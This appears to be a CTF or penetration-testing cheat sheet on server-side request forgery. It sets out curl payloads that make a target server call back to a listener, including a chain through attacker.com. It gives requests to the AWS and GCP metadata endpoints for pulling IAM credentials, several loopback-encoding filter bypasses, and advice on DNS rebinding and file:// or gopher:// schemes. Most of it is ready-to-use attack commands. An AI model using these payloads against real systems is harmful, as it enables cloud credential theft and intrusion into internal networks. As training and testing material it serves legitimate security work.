# SSRF (Server-Side Request Forgery)

## Fastest First-Pass Checklist

```bash
# Purpose: any parameter that takes a URL is a candidate — point it at yourself first
curl -s "https://target.example/fetch?url=http://YOUR_LISTENER:8000/"

# Purpose: check if you receive a callback (start a listener first)
python3 -m http.server 8000
```

## Technique: Basic SSRF Confirmation

**When to use it**: any feature that fetches a URL server-side (image
proxy/thumbnail generator, "import from URL," webhook config, PDF
generator rendering a URL, link preview).

**Fast path**:
```bash
# Purpose: confirm the server actually makes the request out-of-band
curl -s "https://target.example/fetch?url=http://YOUR_LISTENER:8000/ssrf-test"
# check YOUR_LISTENER's logs for the incoming hit
```
**Indicators**: your listener receives a request originating from the
target's IP — confirms the server, not the browser, is fetching the URL.

## Technique: Cloud Metadata Endpoint Access

**When to use it**: target app is plausibly hosted in a cloud environment
(AWS/GCP/Azure) — SSRF into the metadata service can leak credentials.

**Fast path**:
```bash
# Purpose: AWS instance metadata (v1, no token needed on older/misconfigured instances)
curl -s "https://target.example/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Purpose: GCP metadata requires a specific header — SSRF must let you inject/forward it
curl -s "https://target.example/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/" -H "Metadata-Flavor: Google"
```
**Indicators**: response body contains IAM role names, temporary
credentials, or instance metadata — high-value in a CTF context if the
flag is stored as an env var/secret readable this way.

**Common Mistakes**: forgetting that IMDSv2 (AWS) requires a
token-fetching handshake with a custom header — a plain GET to the
metadata IP may fail on hardened instances; check whether the SSRF
primitive lets you set custom headers before concluding it's not
exploitable.

## Technique: Filter/Blocklist Bypass

**Indicators**: naive blocklist rejecting `localhost`/`127.0.0.1` literally
but not equivalent representations.

**Fast path** (bypass candidates to try):
```bash
# Purpose: alternate representations of loopback/internal addresses that bypass string-match filters
curl -s "https://target.example/fetch?url=http://127.1/"
curl -s "https://target.example/fetch?url=http://0.0.0.0/"
curl -s "https://target.example/fetch?url=http://0x7f000001/"          # hex-encoded 127.0.0.1
curl -s "https://target.example/fetch?url=http://[::1]/"               # IPv6 loopback
curl -s "https://target.example/fetch?url=http://localtest.me/"        # resolves to 127.0.0.1 publicly
curl -s "https://target.example/fetch?url=http://attacker.com/redirect_to_internal"  # open-redirect chain
```
**Next Step**: if a domain-based filter is in play (allowlist checks
hostname before resolution), an attacker-controlled DNS record that
resolves to an internal IP (DNS rebinding) may be required — set up a
domain with a very low TTL A record pointing internally.

## Common Mistakes

- Not confirming out-of-band callback before assuming SSRF works based on
  response content alone — some apps swallow errors silently and a "no
  visible change" response can still mean success.
- Testing only `http://` when `file://`, `gopher://`, or `dict://` schemes
  may be allowed and far more impactful (local file read, raw protocol
  smuggling to internal services).
- Giving up after one blocklist bypass attempt — try several encoding
  variants before concluding SSRF isn't reachable through a filtered param.
